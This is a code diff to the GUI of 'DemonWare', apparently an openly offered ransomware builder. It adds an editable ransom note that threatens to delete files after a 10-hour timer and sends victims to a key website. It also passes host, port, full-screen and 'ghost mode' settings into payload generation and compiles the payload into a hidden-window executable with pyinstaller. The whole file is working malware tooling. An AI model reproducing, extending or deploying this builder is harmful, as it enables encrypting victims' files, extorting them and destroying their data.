@@ -105,6 +105,8 @@ class MainWindow(Tk):
             'ghost' : IntVar(),
             'icon_path' : StringVar(),
             'payload_path' : StringVar(),
+            'msg' : StringVar(),
+            'new_msg' : StringVar(),
         }
 
         # Default Settings
@@ -114,6 +116,28 @@ class MainWindow(Tk):
         self.options['mode'].set(1)
         self.options['demo'].set(0)
         self.options['ghost'].set(0)
+
+        self.options['msg'].set('''Tango Down!
+
+Seems like you got hit by DemonWare ransomware!
+
+Don't Panic, you get have your files back!
+
+DemonWare uses a basic encryption script to lock your files.
+This type of ransomware is known as CRYPTO.
+You'll need a decryption key in order to unlock your files.
+
+Your files will be deleted when the timer runs out, so you better hurry.
+You have 10 hours to find your key
+
+C'mon, be glad I don't ask for payment like other ransomware.
+
+Please visit: https://keys.zeznzo.nl and search for your IP/hostname to get your key.
+
+Kind regards,
+
+Zeznzo
+''')
 
         self.bind("<Escape>", self.exit_event) # Press ESC to quit app
 
@@ -284,10 +308,8 @@ class MainWindow(Tk):
                 py = 'pyinstaller'
 
             if icon == True:
-                #os.system("%s -F -w -i %s --hidden-import tkinter --hidden-import tkinter.ttk --hidden-import pycrypto %s" % (py, self.options['icon_path'].get(), self.options['payload_path'].get()))
                 os.system("%s -F -w -i %s --hidden-import tkinter --hidden-import tkinter.ttk --hidden-import pycryptodome %s" % (py, self.options['icon_path'].get(), self.options['payload_path'].get()))
             else:
-                #os.system("%s -F -w --hidden-import tkinter --hidden-import tkinter.ttk --hidden-import pycrypto %s" % (py, self.options['payload_path'].get()))
                 os.system("%s -F -w --hidden-import tkinter --hidden-import tkinter.ttk --hidden-import pycryptodome %s" % (py, self.options['payload_path'].get()))
 
             messagebox.showinfo('SUCCESS', 'Compiled successfully!\nFile located in: dist/\n\nHappy Hacking!')
@@ -328,9 +350,33 @@ class MainWindow(Tk):
         Checkbutton(options_frame, text = 'Demo', variable = self.options['demo'], command = self.check_settings, onvalue = 1, offvalue = 0).grid(row = 0, column = 0)
         Checkbutton(options_frame, text = 'Ghost mode', variable = self.options['ghost'], onvalue = 1, offvalue = 0).grid(row = 0, column = 1)
 
+        content_frame = LabelFrame(self.gen, text = 'Content')
+        content_frame.grid(row = 1, column = 1)
+        set_msg = Button(content_frame, text = 'CUSTOM MESSAGE', command = self.set_msg, width = 25).grid(row = 0, column = 0)
+
         finish_frame = LabelFrame(self.gen, text = 'Finish')
-        finish_frame.grid(row = 1, column = 1, columnspan = 1)
-        generate = Button(finish_frame, text = "GENERATE", command = self.make_demon, width = 20).grid(row = 0, column = 0)
+        finish_frame.grid(row = 2, column = 0, columnspan = 2)
+        generate = Button(finish_frame, text = "GENERATE", command = self.make_demon, width = 50).grid(row = 0, column = 0)
+
+
+    def set_msg(self):
+        self.message = Toplevel()
+        self.message.title(string = 'Set Custom Message')
+        self.message.configure(background = 'white')
+        self.message.resizable(0,0)
+
+        self.message.bind("<Escape>", self.close_set_msg)
+
+        self.options['new_msg'] = Text(self.message, height = 25, width = 100)
+        self.options['new_msg'].grid(row = 0, column = 0)
+        save = Button(self.message, text = 'SAVE', command = self.change_msg, width = 50).grid(row = 1, column = 0)
+
+        self.options['new_msg'].insert(END, self.options['msg'].get())
+        self.options['new_msg'].focus()
+
+    def change_msg(self):
+        self.options['msg'].set(self.options['new_msg'].get('1.0', END))
+        self.message.destroy()
 
     def check_settings(self):
         if self.options['mode'].get() == 2:
@@ -338,10 +384,9 @@ class MainWindow(Tk):
             self.options['demo'].set(0)
             messagebox.showwarning('Disabled', 'Fullscreen and Demo mode are available for GUI mode only, these options have been automaticly disabled!')
 
-
     def make_demon(self):
         try:
-            create_demon(self.options['host'].get(), self.options['port'].get(), self.options['full_screen_var'].get(), self.options['demo'].get(), self.options['ghost'].get())
+            create_demon(self.options['host'].get(), self.options['port'].get(), self.options['full_screen_var'].get(), self.options['demo'].get(), self.options['ghost'].get(), self.options['msg'].get())
             messagebox.showinfo('SUCCESS', 'Payload successfully generated!\n\nFile saved to ./payload.py')
             self.gen.destroy()
         except Exception as e:
@@ -476,6 +521,9 @@ class MainWindow(Tk):
 
     def close_generate(self, event):
         self.gen.destroy()
+
+    def close_set_msg(self, event):
+        self.message.destroy()
 
     def open_github(self):
         webbrowser.open_new_tab('https://www.github.com/leonv024/demon')
